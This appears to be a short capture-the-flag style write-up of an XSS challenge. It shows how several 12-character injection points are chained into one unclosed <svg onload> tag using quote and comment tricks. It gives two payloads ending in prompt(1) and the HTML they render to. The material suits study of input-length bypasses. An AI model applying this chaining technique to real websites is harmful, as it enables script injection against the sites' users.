This challenge has multiple injection points, but each of them has a 12 length limit.

We have to chain the injection points together to exploit this XSS.
Basically, we want a shortest payload possible, since there is a length limit, so the tag we want to use will be `<svg>` and the attribute `onload`.

Then, we need to find a way to chain injection points together, it's impossible to call `prompt(1)` and escape the html in the same injection point, but we can find a way to ignore eveything in the middle and execute our code in the next point.

Payload:
```
"><svg a='#'onload='`#`;prompt(1)'
```
or
```
"><svg a='#'onload='/*#*/prompt(1)'
```

This is how the html looks like:
```html
<p class="comment" title=""><svg a='"></p>
<p class="comment" title="'onload='/*"></p>
<p class="comment" title="*/prompt(1)'"></p>
```
As the rendering shows, we use single quote to connect two inejction points and make all the text inside it meaningless.
And then, there is the `onload` attribute, value inside `onload` is pure javascript, so we have two ways to do the same thing, one is using multi-line comment, another is using template string.

In the case above, the `onload` at the second injection point starts with a single quote and a comment tag; the third injection point starts with comment ending tag and ends with a single quote.

Combine the two points above, this became a unclosed `<svg>` tag with two attributes:
```html
<svg a='"></p>
<p class="comment" title="' onload='/*"></p>
<p class="comment" title="*/prompt(1)'> </svg>
```
The javascript will be valid as long as we comment out everything and close `onload` with a single quote.
